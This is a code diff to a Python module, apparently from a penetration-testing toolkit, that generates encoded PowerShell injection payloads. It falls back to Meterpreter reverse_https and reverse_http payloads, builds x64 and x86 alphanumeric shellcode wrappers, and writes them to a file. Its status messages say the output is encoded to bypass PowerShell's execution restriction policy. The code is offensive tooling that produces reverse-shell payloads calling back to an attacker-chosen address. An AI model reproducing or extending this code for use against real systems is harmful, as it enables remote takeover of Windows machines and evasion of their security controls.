@@ -29,17 +29,18 @@ else:
 
 powershell_inject_x64 = check_config("POWERSHELL_INJECT_PAYLOAD_X64=")
 powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")
-#def metasploit_shellcode(payload):
 print_status("Generating x64-based powershell injection code...")
-x64 = metasploit_shellcode(powershell_inject_x64)
-x64 = shellcode_replace(ipaddr,port, x64)
+
+if validate_ip(ipaddr) == False:
+	powershell_inject_x64 = "windows/meterpreter/reverse_https"
+	powershell_inject_x86 = "windows/meterpreter/reverse_http"
+
+x64 = ""
+x86 = ""
+
 x64 = generate_powershell_alphanumeric_payload(powershell_inject_x64, ipaddr, port, x64)
-
 print_status("Generating x86-based powershell injection code...")
-x86 = metasploit_shellcode(powershell_inject_x86)
-x86 = shellcode_replace(ipaddr, port, x86)
 x86 = generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)
-
 # check to see if we want to display the powershell command to the user
 verbose = check_config("POWERSHELL_VERBOSE=")
 if verbose.lower() == "on":
@@ -58,3 +59,4 @@ filewrite.write(x86)
 filewrite.close()
 print_status("Finished generating powershell injection bypass.")
 print_status("Encoded to bypass exececution restriction policy...")
+
